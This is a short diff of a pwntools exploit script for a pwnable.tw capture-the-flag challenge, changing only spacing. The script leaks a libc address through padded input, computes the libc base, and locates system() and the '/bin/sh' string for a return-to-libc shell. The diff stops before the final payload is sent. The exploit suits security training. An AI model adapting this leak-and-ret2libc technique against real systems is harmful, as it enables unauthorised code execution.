@@ -1,5 +1,5 @@
 from pwn import *
-server = remote('chall.pwnable.tw',10101)
+server = remote('chall.pwnable.tw', 10101)
 
 libc = ELF('./libc_32.so.6')
 #readelf -S libc_32.so.6
@@ -9,7 +9,7 @@ got_plt_offset = 0x1b0000
 payload = 'a'*24
 server.recv()
 server.sendline(payload)
-libc_addr = u32(server.recv()[30:34])-0xa
+libc_addr = u32(server.recv()[30:34]) - 0xa
 libcbase_addr = libc_addr - got_plt_offset
 sys_addr = libcbase_addr + libc.symbols['system']
 bin_sh_addr = libcbase_addr + libc.search('/bin/sh').next()
